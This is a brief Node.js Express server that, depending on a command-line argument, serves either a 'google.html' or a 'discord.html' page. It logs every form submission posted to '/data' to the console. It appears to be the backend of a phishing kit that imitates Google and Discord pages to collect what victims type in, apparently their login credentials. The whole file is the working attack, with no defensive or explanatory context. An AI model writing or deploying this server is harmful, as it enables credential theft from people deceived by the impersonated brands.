const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static("public"));

switch (process.argv[2]) {
  case "google":
    app.get("/", (req, res) => {
      res.sendFile(path.join(__dirname, "/pages/", "google", `google.html`));
    });
    break;
  case "discord":
    app.get("/", (req, res) => {
      res.sendFile(path.join(__dirname, "/pages/", "discord", `discord.html`));
    });
    break;
}

app.post("/data", (req, res) => {
  console.log(req.body);
  res.send("");
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => console.log(`Listening on port 5000`));
